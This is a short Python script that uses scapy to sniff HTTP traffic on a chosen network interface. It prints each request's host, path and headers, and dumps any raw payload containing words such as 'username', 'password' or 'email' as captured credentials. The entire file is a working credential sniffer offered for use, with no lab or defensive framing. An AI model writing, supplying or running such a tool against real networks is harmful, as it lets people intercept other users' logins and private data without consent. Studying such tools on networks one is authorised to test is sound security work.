#!/usr/bin/env python
import sys
import argparse
import logging
from scapy.all import sniff, Raw
from scapy.layers.http import HTTPRequest

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff_packets(iface):
    try:
        print(f"Sniffing on interface {iface}...")
        sniff(iface=iface, store=False, prn=process_packet)
    except Exception as e:
        logging.error(f"Error occurred while sniffing: {str(e)}")

def process_packet(packet):
    try:
        if packet.haslayer(HTTPRequest):
            method = packet[HTTPRequest].Method.decode('utf-8', errors='ignore') if isinstance(packet[HTTPRequest].Method, bytes) else packet[HTTPRequest].Method
            host = packet[HTTPRequest].Host.decode('utf-8', errors='ignore') if isinstance(packet[HTTPRequest].Host, bytes) else packet[HTTPRequest].Host
            path = packet[HTTPRequest].Path.decode('utf-8', errors='ignore') if isinstance(packet[HTTPRequest].Path, bytes) else packet[HTTPRequest].Path
            headers = packet[HTTPRequest].fields  # Get all HTTP headers
            header_info = "; ".join([f"{k}: {v}" for k, v in headers.items() if isinstance(v, bytes)])

            print(f"[+] {method} Request >> {host}{path}")
            print(f"Headers: {header_info}")

            if packet.haslayer(Raw):
                load = packet[Raw].load.decode('utf-8', errors='ignore') if isinstance(packet[Raw].load, bytes) else packet[Raw].load
                keys = ["username", "password", "pass", "email"]
                for key in keys:
                    if key in load:
                        print(f"\n\n\n[+] Possible password/username >> {load}\n\n\n")
                        break
    except Exception as e:
        logging.error(f"Error processing packet: {str(e)}")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
    iface = get_interface()
    if not iface:
        logging.error("Please specify an interface using '-i' or '--interface'")
        sys.exit(1)
    sniff_packets(iface)
